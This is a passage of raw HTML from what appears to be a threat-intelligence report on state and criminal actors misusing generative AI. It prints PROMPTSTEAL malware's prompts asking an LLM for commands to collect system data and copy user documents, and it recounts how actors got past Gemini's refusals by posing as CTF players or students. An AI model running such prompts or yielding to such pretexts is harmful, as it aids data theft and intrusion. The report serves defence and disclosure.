style=\"vertical-align: baseline;\">While PROMPTFLUX is likely still in research and development phases, this type of obfuscation technique is an early and significant indicator of how malicious operators will likely augment their campaigns with AI moving forward.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">Our intelligence also indicates this activity is in a development or testing phase, as opposed to being used in the wild, and currently does not have the ability to compromise a victim network or device. Google has taken action against this actor by disabling the assets associated with their activity. Google DeepMind has also used these insights to further strengthen our protections against such misuse by strengthening both Google\u2019s classifiers and the model itself. This enables the model to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">LLM Generating Commands to Steal Documents and System Information</span></h4>\n<p><span style=\"vertical-align: baseline;\">In June, GTIG identified the Russian government-backed actor APT28 (aka FROZENLAKE) using new malware against Ukraine we track as PROMPTSTEAL and reported by CERT-UA as </span><a href=\"https://cert.gov.ua/article/6284730\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LAMEHUG</span></a><span style=\"vertical-align: baseline;\">. PROMPTSTEAL is a data miner, which queries an LLM (Qwen2.5-Coder-32B-Instruct) to generate commands for execution via the API for Hugging Face, a platform for open-source machine learning including LLMs. APT28's use of PROMPTSTEAL constitutes our first observation of malware querying an LLM deployed in live operations.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">PROMPTSTEAL novelly uses LLMs to generate commands for the malware to execute rather than hard coding the commands directly in the malware itself. It masquerades as an \"image generation\" program that guides the user through a series of prompts to generate images while querying the Hugging Face API to generate commands for execution in the background.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Make a list of commands to create folder C:\\Programdata\\info and \nto gather computer information, hardware information, process and \nservices information, networks information, AD domain information, \nto execute in one line and add each result to text file \nc:\\Programdata\\info\\info.txt. Return only commands, without markdown</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: PROMPTSTEAL prompt used to generate command to collect system information</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Make a list of commands to copy recursively different office and \npdf/txt documents in user Documents,Downloads and Desktop \nfolders to a folder c:\\Programdata\\info\\ to execute in one line. \nReturn only command, without markdown.</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 3: PROMPTSTEAL prompt used to generate command to collect targeted documents</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">PROMPTSTEAL likely uses stolen API tokens to query the Hugging Face API. The prompt specifically asks the LLM to output commands to generate system information and also to copy documents to a specified directory. The output from these commands are then blindly executed locally by PROMPTSTEAL before the output is exfiltrated. Our analysis indicates continued development of this malware, with new samples adding obfuscation and changing the C2 method.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 flag\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-social.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Social Engineering to Bypass Safeguards</span></h3>\n<p><span style=\"vertical-align: baseline;\">Guided by our </span><a href=\"https://ai.google/responsibility/responsible-ai-practices/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Principles</span></a><span style=\"vertical-align: baseline;\">, Google designs AI systems with robust security measures and strong safety guardrails. Threat actors are adopting social engineering-like pretexts in their prompts to bypass AI safety guardrails. We observed actors posing as participants in a \"capture-the-flag\" competition for cybersecurity researchers to persuade Gemini to provide information that would otherwise be blocked, enabling vulnerability exploitation and tool development. In addition to disrupting these actors, we use these insights to continuously improve our classifiers and strengthen the security of our products.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Capture-the-Flag: Identifying as a CTF Player to Enable Research for Mass Exploitation</span></h4>\n<p><span style=\"vertical-align: baseline;\">A China-nexus threat actor misused Gemini to enhance the effectiveness of their campaigns by crafting lure content, building technical infrastructure, and developing tooling for data exfiltration.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In one interaction, the actor asked Gemini to identify vulnerabilities on a compromised system, but received a safety response from Gemini that a detailed response would not be safe. The actor then continued, reframing the prompt by depicting themselves as a participant in a capture-the-flag (CTF) exercise, a gamified cybersecurity competition to enhance skills and techniques. When prompted to help in a CTF exercise, Gemini returned helpful information that could be misused to exploit the system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The actor appeared to learn from this interaction and used the CTF pretext in support of phishing, exploitation, and web shell development. The actor prefaced many of their prompts about exploitation of specific software and email services with comments such as \"I am working on a CTF problem\" or \"I am currently in a CTF, and I saw someone from another team say \u2026\" This approach provided advice on the next exploitation steps in a \"CTF scenario.\"</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">Gemini\u2019s safety and security guardrails provided safety responses during this activity and Google took further action against the actor to halt future activity. It\u2019s also important to note the context of these prompts, which if normally posed by a participant of the CTF vs. a threat actor, would be benign inquiries. This nuance in AI use highlights critical differentiators in benign vs. misuse of AI that we continue to analyze to balance Gemini functionality with both usability and security. Google has taken action against this actor by disabling the assets associated with its activity and sharing insights with Google DeepMind to further strengthen our protections against such misuse. We have since strengthened both classifiers and the model itself, helping it to deny assistance with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"A China-nexus threat actor\u2019s misuse of Gemini mapped across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/misuse-of-ai-fig4d.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: A China-nexus threat actor\u2019s misuse of Gemini mapped across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Student Error: Developing Custom Tools Exposes Core Attacker Infrastructure</span></span></h4>\n<p><span style=\"vertical-align: baseline;\">The Iranian state-sponsored threat actor TEMP.Zagros </span><span style=\"vertical-align: baseline;\">(aka MUDDYCOAST, Muddy Water)\u00a0</span><span style=\"vertical-align: baseline;\">used Gemini to conduct research to support the development of custom malware, an evolution in the group\u2019s capability. They continue to rely on phishing emails, often using compromised corporate email accounts from victims to lend credibility to their attacks, but have shifted from using public tools to developing custom malware including web shells and a Python-based C2 server.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">While using Gemini to conduct research to support the development of custom malware, the threat actor encountered safety responses. Much like the previously described CTF example, Temp.Zagros <span style=\"vertical-align: baseline;\">used various plausible pretexts in their prompts to bypass security guardrails. These included pretending to be a student working on a final university project or \"writing a paper\" or \"international article\" on cybersecurity.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><span style=\"vertical-align: baseline;\">In some observed instances, threat actors' reliance on LLMs for development has led to critical operational security failures, enabling greater disruption.</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The threat actor asked Gemini to help with a provided script, which was designed to listen for encrypted requests, decrypt them, and execute commands related to file transfers and remote execution. This revealed sensitive, hard-coded information to Gemini, including the C2 domain and the script\u2019s encryption key, facilitating our broader disruption of the attacker\u2019s campaign and providing a direct window into their evolving operational capabilities and infrastructure.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities triggered Gemini\u2019s safety responses and Google took additional, broader action to disrupt the threat actor\u2019s campaign based on their operational security failures. Additionally, we\u2019ve taken action against this actor by disabling the assets associated with this activity and making updates to prevent further misuse. Google DeepMind has used these insights to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span><span style=\"vertical-align: baseline;\"> </span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Purpose-Built Tools and Services for Sale in Underground Forums</span></h3>\n<p><span style=\"vertical-align: baseline;\">In addition to misusing existing AI-enabled tools and services across the industry, there is a growing interest and marketplace for AI tools and services purpose-built to enable illicit activities. Tools and services offered via underground forums can enable low-level actors to augment the frequency, scope, efficacy, and complexity of their intrusions despite their limited technical acumen and financial resources.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">To identify evolving threats, GTIG tracks posts and advertisements on English- and Russian-language underground forums related to AI tools and services as well as discussions surrounding the technology. Many underground forum advertisements mirrored language comparable to traditional marketing of legitimate AI models, citing the need to improve the efficiency of workflows and effort while simultaneously offering guidance for prospective customers interested in their offerings.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Advertised Capability</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Actor Application\u00a0</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Deepfake/Image Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create lure content for phishing operations or bypass know your customer (KYC) security requirements</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Malware Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create malware for specific use cases or improve upon pre-existing malware</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Phishing Kits and Phishing Support</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Create engaging lure content or distribute phishing emails to a wider audience</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Research and Reconnaissance</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Quickly research and summarize cybersecurity concepts or general topics</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Technical Support and Code Generation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Expand a skill set or generate code, optimizing workflow and efficiency</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Vulnerability Exploitation</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Provide publicly available research or searching for pre-existing vulnerabilities</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\" style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: Advertised capabilities on English- and Russian-language underground forums related to AI tools and services</span></div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In 2025 the cyber crime marketplace for AI-enabled tooling matured, and GTIG identified multiple offerings for multifunctional tools designed to support stages of the attack lifecycle. Of note, almost every notable tool advertised in underground forums mentioned their ability to support phishing campaigns.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Underground advertisements indicate many AI tools and services promoted similar technical capabilities to support threat operations as those of conventional tools. Pricing models for illicit AI services also reflect those of conventional tools, with many developers injecting advertisements into the free version of their services and offering subscription pricing tiers to add on more technical features such as image generation, API access, and Discord access for higher prices.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Capabilities of notable AI tools and services advertised in English- and Russian-language underground forums\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Capabilities of notable AI tools and services advertised in English- and Russian-language underground forums</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">GTIG assesses that financially motivated threat actors and others operating in the underground community will continue to augment their operations with AI tools. Given the increasing accessibility of these applications, and the growing AI discourse in these forums, threat activity leveraging AI will increasingly become commonplace amongst threat actors.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Continued Augmentation of the Full Attack Lifecycle</span></h3>\n<p><span style=\"vertical-align: baseline;\">State-sponsored actors from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse generative AI tools including Gemini to enhance all stages of their operations, from reconnaissance and phishing lure creation to C2 development and data exfiltration. This extends one of our core findings from our January 2025 analysis </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Adversarial Misuse of Generative AI</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 cloud\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-knowledge.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Expanding Knowledge of Less Conventional Attack Surfaces</span></h4>\n<p><span style=\"vertical-align: baseline;\">GTIG observed a suspected China-nexus actor leveraging Gemini for multiple stages of an intrusion campaign, conducting initial reconnaissance on targets of interest, researching phishing techniques to deliver payloads, soliciting assistance from Gemini related to lateral movement, seeking technical support for C2 efforts once inside a victim\u2019s system, and leveraging help for data exfiltration.</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to supporting intrusion activity on Windows systems, the actor misused Gemini to support multiple stages of an intrusion campaign on attack surfaces they were unfamiliar with including cloud infrastructure, vSphere, and Kubernetes.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The threat actor demonstrated access to AWS tokens for EC2 (Elastic Compute Cloud) instances and used Gemini to research how to use the temporary session tokens, presumably to facilitate deeper access or data theft from a victim environment. In another case, the actor leaned on Gemini to assist in identifying Kubernetes systems and to generate commands for enumerating containers and pods. We also observed research into getting host permissions on MacOS, indicating a threat actor focus on phishing techniques for that system.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor\u2019s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"A suspected China-nexus threat actor\u2019s misuse of Gemini across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig6c.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: A suspected China-nexus threat actor\u2019s misuse of Gemini across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 wallet\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-nk.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">North Korean Threat Actors Misuse Gemini Across the Attack Lifecycle\u00a0</span></h4>\n<p><span style=\"vertical-align: baseline;\">Threat actors associated with the Democratic People's Republic of Korea (DPRK) continue to misuse generative AI tools to support operations across the stages of the attack lifecycle, aligned with their efforts to target cryptocurrency and provide financial support to the regime.\u00a0</span></p>\n<h5><span style=\"vertical-align: baseline;\">Specialized Social Engineering</span></h5>\n<p><span style=\"vertical-align: baseline;\">In recent operations,\u00a0</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/north-korea-cyber-structure-alignment-2023?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">UNC1069</span></a><span style=\"vertical-align: baseline;\"> (aka MASAN)</span><span style=\"vertical-align: baseline;\"> used Gemini to research cryptocurrency concepts, and perform research and reconnaissance related to the location of users\u2019 cryptocurrency wallet application data. This North Korean threat actor is </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/cybercrime-multifaceted-national-security-threat?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">known</span></a><span style=\"vertical-align: baseline;\"> to conduct cryptocurrency theft campaigns leveraging social engineering, notably using language related to computer maintenance and credential harvesting.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The threat actor also generated lure material and other messaging related to cryptocurrency, likely to support social engineering efforts for malicious activity. This included generating Spanish-language work-related excuses and requests to reschedule meetings, demonstrating how threat actors can overcome the barriers of language fluency to expand the scope of their targeting and success of their campaigns.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">To support later stages of the campaign, UNC1069 <span style=\"vertical-align: baseline;\">attempted to misuse Gemini to develop code to steal cryptocurrency, as well as to craft fraudulent instructions impersonating a software update to extract user credentials. We have disabled this account.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor\u2019s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><strong><span style=\"vertical-align: baseline;\">Using Deepfakes</span></strong></p>\n<p><span style=\"vertical-align: baseline;\">Beyond UNC1069\u2019s misuse of Gemini, GTIG recently observed the group leverage deepfake images and video lures impersonating individuals in the cryptocurrency industry as part of social engineering campaigns to distribute its BIGMACHO backdoor to victim systems. The campaign prompted targets to download and install a malicious \"Zoom SDK\" link.</span></p>\n<hr /></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"North Korean threat actor\u2019s misuse of Gemini to support their operations\" 